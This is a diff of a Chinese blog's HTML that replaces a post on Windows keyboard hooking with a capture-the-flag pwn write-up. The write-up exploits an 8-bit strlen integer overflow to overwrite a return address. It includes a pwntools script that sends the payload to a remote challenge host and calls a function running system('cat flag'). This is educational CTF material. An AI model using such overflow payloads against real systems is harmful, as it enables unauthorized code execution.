class="built_in">puts</span>(<span class="string">"Invalid Password"</span>);</span><br><span class="line">    result = (<span class="keyword">char</span> *)fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success"</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    result = <span class="built_in">strcpy</span>(&amp;dest, s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>运行HookMain.exe可安装键盘钩子</p>
-<p><img src="/windows消息钩取/2.png" alt></p>
-<p>输入q可停止键盘钩取</p>
-<h2 id="调试HookMain-exe"><a href="#调试HookMain-exe" class="headerlink" title="调试HookMain.exe"></a>调试HookMain.exe</h2><p>通过字符串检索找到main函数</p>
-<p><img src="/windows消息钩取/3.png" alt></p>
-<p>程序在00C2140E地址处调用LoadLibraryA(KeyHook.dll)</p>
-<p>调用了SetWindowsHookExW()函数时，先有两条PUSH指令将该函数的第一、第二两个参数压入栈。其中第一个参数idHook值为2，即WH_KEYBOARD，第二个参数lpfn值为为钩子过程的地址。</p>
-<p><code>调试notepad.exe进程中的KeyHook.dll</code></p>
-<p>运行notpead.exe后弹出Executable modules窗口，KeyHook.dll已被加载</p>
-<p><strong>操作过程</strong><br><img src="/windows消息钩取/4.png" alt></p>
+<p> unsigned _ int8 v3; // [esp+Fh] [ebp-9h]设置了一个用一个字节8bit的变量v3，存passwd，之后看到了不安全函数strlen（），然后strcpy将passwd拷贝进stack中，dest距ebp是14h,所以stack中给出的保存passwd的大小为0x14，十进制是20，passwd接受0x199（十进制409），长度大于1字节，所以存在整数溢出，password字符串的长度可以是3-8个字符，也可以是259-264个字符。</p>
+<h1 id="查看what-is-this函数"><a href="#查看what-is-this函数" class="headerlink" title="查看what_is_this函数"></a>查看what_is_this函数</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">what_is_this</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"cat flag"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用了system函数，system函数地址是0804868B</p>
+<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>strlen存在溢出漏洞，因为32位程序中strlen把结果放在al中，而al是八位的，所以能存的最大值为255（1111 1111），如果超过255，就会导致整形溢出。例如261（1 0000 0101‬）最终输出的结果就是（0000 0101），而read(0,&amp;buf,0x199u)获取的输入可以远大于255,所以我们输入的s只要在259-264即可造成整数溢出，但是要求输入的s长度在(4,8]之间。所以通过整数溢出来越过这个限制，然后跳转到0x0804868B的函数就可以获取flag。<br>之后就要分析一下需要覆盖多少位了。在字符串拷贝之前，先把拷贝的源地址和目的地址压入堆栈，查看整个函数的汇编代码，就会发现，在函数最开始，压入了ebp变量，在函数结尾，存在一条leave指令，而在32位程序中，leave指令等于mov esp,ebp和pop ebp两条指令的组合，也就是说，在覆盖函数返回地址之前，还有一次出栈操作，出栈数据大小4字节，即覆盖之前还需将这4字节覆盖了，才能实现跳转指向what_is_this函数。</p>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>259-264之间随机选择一个数。选择262，264-0x14-4-4=234<br>想要覆盖到返回地址，先使用0x14个数据覆盖stack拷贝的passed的内存区域，然后使用4字节数据覆盖ebp，再使用”cat flag”的地址覆盖返回地址，最后接上262剩余的数据即可。</p>
+<p>可构造payload<br>payload = “a” * 0x14 + “aaaa” + p32(cat_flag_addr) + “a” * 234</p>
+<p>payload1 = ‘a’ * 0x14 + “aaaa” + p32(cat_flag_addr)<br>payload1 = payload1+ ‘a’ * (262-int(len(payload1)))</p>
+<p>payload2=”a” * 0x14 + “aaaa” + p32(cat_flag_addr)<br>payload2 = payload2.ljust( 262,”a”)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">"111.198.29.45"</span>,<span class="string">"32607"</span>)</span><br><span class="line">cat_flag_addr = <span class="number">0x0804868B</span></span><br><span class="line">p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'username:\n'</span>)</span><br><span class="line">p.sendline(<span class="string">"Thriumph"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"passwd:\n"</span>)</span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">0x14</span> + <span class="string">"aaaa"</span> + p32(cat_flag_addr) + <span class="string">"a"</span> * <span class="number">234</span></span><br><span class="line"><span class="comment">#payload1 = 'a' * 0x14 + "aaaa" + p32(cat_flag_addr)</span></span><br><span class="line"><span class="comment">#payload1 = payload1+ 'a' * (262-int(len(payload1)))</span></span><br><span class="line"><span class="comment">#payload2="a" * 0x14 + "aaaa" + p32(cat_flag_addr)</span></span><br><span class="line"><span class="comment">#payload2 = payload2.ljust( 262,"a")</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#p.sendline(payload1)</span></span><br><span class="line"><span class="comment">#p.sendline(payload2)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
 
       
       
@@ -291,7 +290,7 @@
           
           <br>
           <strong>本文链接：</strong>
-          https://thriumph.top/windows消息钩取.html
+          https://thriumph.top/int-overflow.html
           <br>
           <strong>版权声明：</strong>
           本作品采用
@@ -316,11 +315,11 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">windows</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">hook</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
         		</li>
       		
 		</ul>
@@ -376,7 +375,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://thriumph.top//windows消息钩取.html" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://thriumph.top//int-overflow.html" alt="微信分享二维码">
     </div>
 </div>
 
@@ -390,18 +389,18 @@
   
 <nav id="article-nav">
   
-    <a href="/RC4.html" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/cgpwn2.html" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          RC4
+          cgpwn2
         
       </div>
     </a>
   
   
-    <a href="/DLL注入.html" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">DLL注入</div>
+    <a href="/sysmalloc.html" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">sysmalloc</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -428,7 +427,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#windows消息机制"><span class="toc-number">1.</span> <span class="toc-text">windows消息机制</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#钩子"><span class="toc-number">2.</span> <span class="toc-text">钩子</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#常规windows消息流"><span class="toc-number">3.</span> <span class="toc-text">常规windows消息流</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#消息钩取工作原理"><span class="toc-number">4.</span> <span class="toc-text">消息钩取工作原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#windows消息钩取的实现——SetWindowsHookEx"><span class="toc-number">5.</span> <span class="toc-text">windows消息钩取的实现——SetWindowsHookEx()</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#键盘消息钩子"><span class="toc-number">6.</span> <span class="toc-text">键盘消息钩子</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Keyhook-cpp"><span class="toc-number">6.1.</span> <span class="toc-text">Keyhook.cpp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HookMain-cpp"><span class="toc-number">6.2.</span> <span class="toc-text">HookMain.cpp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#KeybroadProc-函数定义"><span class="toc-number">6.2.1.</span> <span class="toc-text">KeybroadProc()函数定义</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#调试HookMain-exe"><span class="toc-number">6.3.</span> <span class="toc-text">调试HookMain.exe</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#整数溢出的原理"><span class="toc-number">1.</span> <span class="toc-text">整数溢出的原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#查看保护"><span class="toc-number">2.</span> <span class="toc-text">查看保护</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#查看main（）函数"><span class="toc-number">3.</span> <span class="toc-text">查看main（）函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#查看login-函数"><span class="toc-number">4.</span> <span class="toc-text">查看login()函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#查看check-passwd"><span class="toc-number">5.</span> <span class="toc-text">查看check_passwd</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#查看what-is-this函数"><span class="toc-number">6.</span> <span class="toc-text">查看what_is_this函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#思路"><span class="toc-number">7.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp"><span class="toc-number">8.</span> <span class="toc-text">exp</span></a></li></ol>
                     </div>
                 </span>
             </div>
